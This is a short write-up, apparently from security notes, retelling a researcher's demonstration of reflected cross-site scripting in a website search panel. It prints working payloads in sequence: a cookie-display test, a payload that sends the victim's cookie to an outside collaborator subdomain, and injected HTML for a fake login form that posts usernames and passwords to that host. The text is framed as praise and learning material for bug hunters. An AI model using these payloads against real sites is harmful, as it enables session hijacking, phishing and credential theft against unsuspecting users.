This document has been made thanks to [coffinxp7](https://x.com/coffinxp7).

He find a panel where you can search and you have a output of the result.
The video is available in [twitter](https://x.com/coffinxp7/status/1839264787328270604)

He firstly execute that RXSS into the search bar to test if is vulnerable.

``` html
<img src=x onerror=prompt(document.cookie)>
```

On the video we can see that the RXSS is valid, so he after create a oastify subdomain throw Burpsuite and capture the cookie of the victim.
To capture the cookie he implement this RXSS:

``` html
<img src=x onerror="document.location='http://subdomain.oastify.com?c='+document.cookie;" />
```

After he see the impact of the vulnerability, he develops an a phising page thanks to the vulnerabilitie injecting code to show a "valid" login with the following RXSS:

``` html
<h3>Please login to proceed</h3> <form action=http://SUBDOMAIN.oastify.com>Username:<br>
<input type="username" name="username"></br>Password:<br><input type="password" name="password"></br><br><input type="submit" value="Login"></br>
```

After inject that code he was able to capture credentials + cookies.

Very good job of [@coffinxp7](https://x.com/coffinxp7).
